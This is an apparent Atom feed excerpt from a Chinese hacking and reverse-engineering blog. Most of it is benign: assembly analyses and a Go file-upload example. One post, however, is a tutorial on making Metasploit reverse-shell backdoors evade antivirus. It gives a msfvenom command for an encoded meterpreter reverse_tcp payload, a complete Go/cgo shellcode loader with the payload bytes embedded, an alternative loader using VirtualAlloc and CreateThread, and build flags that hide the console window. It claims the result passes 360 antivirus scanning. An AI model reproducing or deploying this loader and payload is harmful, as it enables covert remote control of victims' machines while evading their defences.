<p>跳转表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">004010D9  58 10 40 00  X.@.</div><div class="line">004010DD  6B 10 40 00  k.@.</div><div class="line">004010E1  7E 10 40 00  ~.@.</div><div class="line">004010E5  91 10 40 00  ..@.</div><div class="line">004010E9  A4 10 40 00  ..@.</div><div class="line">004010ED  B7 10 40 00  ..@.</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>最最简单的c语言函数汇编分析</title>
    <link href="http://hacktech.cn/2017/09/06/%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html"/>
    <id>http://hacktech.cn/2017/09/06/最最简单的c语言函数汇编分析.html</id>
    <published>2017-09-06T06:18:26.000Z</published>
    <updated>2017-09-06T06:20:24.288Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>xp+vc6.0</p>
<h2 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>以下是vc6.0的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">1:    int plus(int x, int y)</div><div class="line">2:    &#123;</div><div class="line">00401020   push        ebp</div><div class="line">00401021   mov         ebp,esp</div><div class="line">00401023   sub         esp,40h</div><div class="line">00401026   push        ebx</div><div class="line">00401027   push        esi</div><div class="line">00401028   push        edi</div><div class="line">00401029   lea         edi,[ebp-40h]</div><div class="line">0040102C   mov         ecx,10h</div><div class="line">00401031   mov         eax,0CCCCCCCCh</div><div class="line">00401036   rep stos    dword ptr [edi]</div><div class="line">3:        return 0;</div><div class="line">00401038   xor         eax,eax</div><div class="line">4:    &#125;</div><div class="line">0040103A   pop         edi</div><div class="line">0040103B   pop         esi</div><div class="line">0040103C   pop         ebx</div><div class="line">0040103D   mov         esp,ebp</div><div class="line">0040103F   pop         ebp</div><div class="line">00401040   ret</div></pre></td></tr></table></figure></p>
<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">push      ebp</div><div class="line">mov       ebp,esp</div><div class="line">sub       esp,40h</div><div class="line">//提升栈，为函数腾出空间，为ebp寻址做准备</div><div class="line">push      ebx</div><div class="line">push      esi</div><div class="line">push      edi</div><div class="line">//寄存器压栈，保存现场</div><div class="line">lea       edi,[ebp-40h]</div><div class="line">//将ebp-40h（esp）的具体内存地址存到edi</div><div class="line">mov       ecx,10h</div><div class="line">//10（十六进制）存入计数寄存器</div><div class="line">mov       eax,0xCCCCCCCC</div><div class="line">//初始化eax</div><div class="line">rep stos  dword ptr [edi]</div><div class="line">//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-&gt;esp全部被初始化）</div><div class="line">xor       eax,eax</div><div class="line">//eax清零</div><div class="line">pop       edi</div><div class="line">pop       esi</div><div class="line">pop       ebx</div><div class="line">mov       esp,ebp</div><div class="line">pop       ebp</div><div class="line">ret</div><div class="line">//寄存器出栈，恢复现场，堆栈平衡并返回</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-环境&quot;&gt;&lt;a href=&quot;#0x01-环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境&quot;&gt;&lt;/a&gt;0x01 环境&lt;/h2&gt;&lt;p&gt;xp+vc6.0&lt;/p&gt;
&lt;h2 id=&quot;0x02-代码&quot;&gt;&lt;a href=&quot;#0x02-代码&quot; class=&quot;headerlink&quot; title=&quot;0x02 代码&quot;&gt;&lt;/a&gt;0x02 代码&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Golang模拟客户端POST表单功能文件上传</title>
    <link href="http://hacktech.cn/2017/07/07/Golang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFPOST%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"/>
    <id>http://hacktech.cn/2017/07/07/Golang模拟客户端POST表单功能文件上传.html</id>
    <published>2017-07-07T05:04:50.000Z</published>
    <updated>2017-09-04T15:26:47.782Z</updated>
    
    <content type="html"><![CDATA[<p>客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。<br><a id="more"></a><br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"bytes"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">    <span class="string">"io"</span></div><div class="line">    <span class="string">"io/ioutil"</span></div><div class="line">    <span class="string">"mime/multipart"</span></div><div class="line">    <span class="string">"net/http"</span></div><div class="line">    <span class="string">"os"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">postFile</span><span class="params">(filename <span class="keyword">string</span>, targetUrl <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</div><div class="line">    bodyBuf := &amp;bytes.Buffer&#123;&#125;</div><div class="line">    bodyWriter := multipart.NewWriter(bodyBuf)</div><div class="line"></div><div class="line">    <span class="comment">//关键的一步操作</span></div><div class="line">    fileWriter, err := bodyWriter.CreateFormFile(<span class="string">"uploadfile"</span>, filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error writing to buffer"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//打开文件句柄操作</span></div><div class="line">    fh, err := os.Open(filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error opening file"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> fh.Close()</div><div class="line"></div><div class="line">    <span class="comment">//iocopy</span></div><div class="line">    _, err = io.Copy(fileWriter, fh)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    contentType := bodyWriter.FormDataContentType()</div><div class="line">    bodyWriter.Close()</div><div class="line"></div><div class="line">    resp, err := http.Post(targetUrl, contentType, bodyBuf)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> resp.Body.Close()</div><div class="line">    resp_body, err := ioutil.ReadAll(resp.Body)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    fmt.Println(resp.Status)</div><div class="line">    fmt.Println(<span class="keyword">string</span>(resp_body))</div><div class="line">    <span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// sample usage</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    target_url := <span class="string">"http://localhost/upload"</span></div><div class="line">    filename := <span class="string">"./example.pdf"</span></div><div class="line">    postFile(filename, target_url)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://hacktech.cn/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://hacktech.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>关于msf反弹后门的免杀Tips</title>
    <link href="http://hacktech.cn/2017/04/20/msf-AntiVirus.html"/>
    <id>http://hacktech.cn/2017/04/20/msf-AntiVirus.html</id>
    <published>2017-04-20T05:09:24.000Z</published>
    <updated>2017-04-20T14:00:25.177Z</updated>
    
    <content type="html"><![CDATA[<p>msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧<br><a id="more"></a></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机<br>这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果</p>
<h2 id="得到shellcode"><a href="#得到shellcode" class="headerlink" title="得到shellcode"></a>得到shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 <span class="_">-e</span> x86/shikata_ga_nai -i 11 <span class="_">-f</span> py &gt; 1.py</div></pre></td></tr></table></figure>
<p>建议是生成32位的，如果想生成64位也可以，<code>-e x86/shikata_ga_nai -i 11</code>是指用<code>x86/shikata_ga_nai</code>编码迭代11次，然后生成py文件<br>py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的</p>
<h2 id="Golang环境搭建"><a href="#Golang环境搭建" class="headerlink" title="Golang环境搭建"></a>Golang环境搭建</h2><p>安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用<a href="http://tdm-gcc.tdragon.net/download" target="_blank" rel="external">TDM-GCC</a>）</p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">void call(char *code) &#123;</div><div class="line">    int (*ret)() = (int(*)())code;</div><div class="line">    ret();</div><div class="line">&#125;</div><div class="line">*/</div><div class="line"><span class="keyword">import</span> <span class="string">"C"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    buf := <span class="string">""</span></div><div class="line">    buf += <span class="string">"\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"</span></div><div class="line">    buf += <span class="string">"\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"</span></div><div class="line">    buf += <span class="string">"\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f"</span></div><div class="line">    buf += <span class="string">"\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce"</span></div><div class="line">    buf += <span class="string">"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13"</span></div><div class="line">    buf += <span class="string">"\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0"</span></div><div class="line">    buf += <span class="string">"\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e"</span></div><div class="line">    buf += <span class="string">"\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a"</span></div><div class="line">    buf += <span class="string">"\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c"</span></div><div class="line">    buf += <span class="string">"\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a"</span></div><div class="line">    buf += <span class="string">"\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47"</span></div><div class="line">    buf += <span class="string">"\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d"</span></div><div class="line">    buf += <span class="string">"\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42"</span></div><div class="line">    buf += <span class="string">"\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4"</span></div><div class="line">    buf += <span class="string">"\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79"</span></div><div class="line">    buf += <span class="string">"\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23"</span></div><div class="line">    buf += <span class="string">"\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d"</span></div><div class="line">    buf += <span class="string">"\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6"</span></div><div class="line">    buf += <span class="string">"\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2"</span></div><div class="line">    buf += <span class="string">"\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08"</span></div><div class="line">    buf += <span class="string">"\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32"</span></div><div class="line">    buf += <span class="string">"\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e"</span></div><div class="line">    buf += <span class="string">"\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5"</span></div><div class="line">    buf += <span class="string">"\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a"</span></div><div class="line">    buf += <span class="string">"\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3"</span></div><div class="line">    buf += <span class="string">"\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb"</span></div><div class="line">    buf += <span class="string">"\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35"</span></div><div class="line">    buf += <span class="string">"\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca"</span></div><div class="line">    buf += <span class="string">"\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd"</span></div><div class="line">    buf += <span class="string">"\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a"</span></div><div class="line">    buf += <span class="string">"\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab"</span></div><div class="line">    buf += <span class="string">"\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d"</span></div><div class="line">    buf += <span class="string">"\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70"</span></div><div class="line">    buf += <span class="string">"\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69"</span></div><div class="line">    buf += <span class="string">"\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0"</span></div><div class="line">    buf += <span class="string">"\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8"</span></div><div class="line">    buf += <span class="string">"\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec"</span></div><div class="line">    buf += <span class="string">"\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd"</span></div><div class="line">    buf += <span class="string">"\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17"</span></div><div class="line">    buf += <span class="string">"\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd"</span></div><div class="line">    buf += <span class="string">"\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b"</span></div><div class="line">    buf += <span class="string">"\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c"</span></div><div class="line">    buf += <span class="string">"\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c"</span></div><div class="line">    buf += <span class="string">"\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6"</span></div><div class="line">    buf += <span class="string">"\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3"</span></div><div class="line">    buf += <span class="string">"\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64"</span></div><div class="line">    buf += <span class="string">"\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65"</span></div><div class="line">    buf += <span class="string">"\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55"</span></div><div class="line">    buf += <span class="string">"\x5d\x1b\xda\x35\xc1\x2d"</span></div><div class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></div><div class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></div><div class="line">    shellcode := []<span class="keyword">byte</span>(buf)</div><div class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上就是全部代码<br>其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"syscall"</span></div><div class="line">    <span class="string">"unsafe"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreadExecute</span><span class="params">(Shellcode []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> K32 = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</div><div class="line">    <span class="keyword">var</span> CreateThread = K32.MustFindProc(<span class="string">"CreateThread"</span>)</div><div class="line">    <span class="keyword">var</span> VirtualAlloc = K32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</div><div class="line">    <span class="keyword">var</span> WaitForSingleObject = K32.MustFindProc(<span class="string">"WaitForSingleObject"</span>)</div><div class="line"></div><div class="line">    Addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)</div><div class="line">    AddrPtr := (*[<span class="number">990000</span>]<span class="keyword">byte</span>)(unsafe.Pointer(Addr))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Shellcode); i++ &#123;</div><div class="line">        AddrPtr[i] = Shellcode[i]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ThreadAddr, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, Addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">    WaitForSingleObject.Call(ThreadAddr, <span class="number">0xFFFFFFFF</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的</p>
<h2 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h2><p>在代码所在目录cmd执行<code>go build</code>得到二进制文件（或者可以用<code>go build -ldflags=&quot;-s -w&quot;</code>减小体积，<code>go build -ldflags=&quot;-H windowsgui -s -w&quot;</code>去掉命令窗口）<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png" alt=""><br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png" alt=""></p>
<p>可以看到360的静态查杀和动态查杀都没有发现<br>那么是否正常工作呢<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png" alt=""></p>
<p>可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png" alt=""></p>
<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><div class="bili_video"><embed height="452" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="http://share.acg.tv/flash.swf" flashvars="aid=9975200&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>自己网盘的页面生成器(私用公开-Golang)</title>
    <link href="http://hacktech.cn/2017/04/13/my-yun-generateHTML-with-golang.html"/>
    <id>http://hacktech.cn/2017/04/13/my-yun-generateHTML-with-golang.html</id>
    <published>2017-04-13T08:41:34.000Z</published>
    <updated>2017-04-14T15:55:42.737Z</updated>
    
    <content type="html"><![CDATA[<p>虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的</p>
<h2 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h2><p>这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）<br><a id="more"></a></p>
<h2 id="关于页面的生成"><a href="#关于页面的生成" class="headerlink" title="关于页面的生成"></a>关于页面的生成</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>那时候只有两三个文件，html页面是我手写的手动增加的</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html</p>
